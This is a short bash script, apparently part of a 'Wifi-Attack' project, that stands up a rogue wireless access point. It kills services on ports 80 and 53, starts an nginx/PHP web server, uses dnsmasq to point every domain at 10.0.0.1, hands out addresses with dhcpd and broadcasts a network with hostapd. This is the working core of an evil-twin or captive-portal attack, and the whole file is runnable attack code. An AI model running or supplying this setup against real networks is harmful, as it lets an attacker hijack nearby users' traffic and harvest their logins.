#!/bin/bash

#Check root
if [ "$EUID" -ne 0 ]
then
echo "Permission denied"
exit
fi

#Start the attack
WIFI_INTERFACE=$(cat /Wifi-Attack/WifiInterface)

#KILL PORT 80
while [ "$(sudo fuser -k 80/tcp)" != "" ]
do
sleep 1
done

killall nginx
killall php-fpm7.0

#Start things properly
php-fpm7.0  #URL of sock is: /run/php/php7.0-fpm.sock
nginx

#Web server running

#KILL PORT 53
while [ "$(sudo fuser -k 53/tcp)" != "" ]
do
sleep 1
done

#Start dnsmasq
dnsmasq --address=/#/10.0.0.1

#Start the actual wlan
ifconfig $WIFI_INTERFACE up 10.0.0.1 netmask 255.255.255.0

sleep 2

#Launching dhcp
killall dhcpd
dhcpd $WIFI_INTERFACE &

#Starting wifi
sysctl -w net.ipv4.ip_forward=1

#Start the wifi
killall hostapd
hostapd /Wifi-Attack/hostapd.conf
